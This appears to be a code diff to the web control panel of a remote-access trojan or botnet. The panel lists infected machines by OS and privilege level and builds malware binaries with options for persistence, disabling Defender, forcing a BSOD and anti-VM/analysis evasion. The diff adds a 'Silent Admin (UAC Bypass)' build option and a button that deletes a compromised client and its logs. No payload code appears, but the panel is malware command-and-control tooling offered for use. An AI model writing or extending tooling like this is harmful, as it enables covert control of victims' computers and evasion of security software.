@@ -615,7 +615,7 @@
                         <button class="btn-action" id="btn-refresh-clients" onclick="refreshClientsList()" title="Refresh List"><i class="fa-solid fa-sync-alt"></i> REFRESH</button>
                     </div>
                 </div>
-            <div class="win-body" style="padding: 0;">
+            <div class="win-body" style="padding: 0; max-height: 400px; overflow-y: auto;">
                 <table class="glass-table" id="clients-table">
                     <thead>
                         <tr>
@@ -625,6 +625,7 @@
                             <th>OS Info</th>
                             <th>Integrity</th>
                             <th>Status</th>
+                            <th style="text-align:right">Actions</th>
                         </tr>
                     </thead>
                     <tbody id="clients-body">
@@ -673,6 +674,10 @@
                 <div class="toggle-row">
                     <div class="toggle-label" style="color: var(--danger)"><i class="fa-solid fa-eye-slash"></i> Anti-VM / Analysis Evasion</div>
                     <label class="switch"><input type="checkbox" id="b-anti"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <div class="toggle-label" style="color: var(--danger)"><i class="fa-solid fa-shield-halved"></i> Silent Admin (UAC Bypass)</div>
+                    <label class="switch"><input type="checkbox" id="b-silent-admin"><span class="slider"></span></label>
                 </div>
 
                 <button class="btn-primary" onclick="compilePayload()" id="btn-build">Compile Binary</button>
@@ -1378,10 +1383,30 @@
                     <td><i class="fa-brands ${icon} os-icon"></i> ${c.os || '?'}</td>
                     <td>${integrity}</td>
                     <td><div class="status-badge ${statusClass}"><div style="width:6px;height:6px;border-radius:50%;background:currentColor"></div>${statusTxt}</div></td>
+                    <td style="text-align:right; padding-right: 15px;">
+                        <button class="btn-action btn-kill" onclick="deleteClient('${c.id}')" title="Delete Client"><i class="fa-solid fa-trash"></i></button>
+                    </td>
                 `;
                 tbody.appendChild(tr);
             });
             attachContextMenu();
+        }
+
+        function deleteClient(cid) {
+            if(!confirm(`Permanently delete client ${cid.substring(0,8)} and all associated logs?`)) return;
+            fetch(`/api/panel/clients/${cid}`, {
+                method: 'DELETE',
+                headers: { 'X-Token': token }
+            })
+            .then(r => r.json())
+            .then(d => {
+                if(d.ok) {
+                    _clientMap.delete(cid);
+                    renderClients(_clientMap);
+                    islandNotify('trash', 'CLIENT DELETED', 'success');
+                    logTerminal(`Agent ${cid.substring(0,8)} purged from database.`, 'warn');
+                }
+            });
         }
 
         // --- 8. Builder Logic ---
@@ -1398,7 +1423,8 @@
                 persist: document.getElementById('b-persist').checked,
                 defender: document.getElementById('b-defend').checked,
                 bsod: document.getElementById('b-bsod').checked,
-                anti: document.getElementById('b-anti').checked
+                anti: document.getElementById('b-anti').checked,
+                silent_admin: document.getElementById('b-silent-admin').checked
             };
 
             fetch('/api/panel/build', {
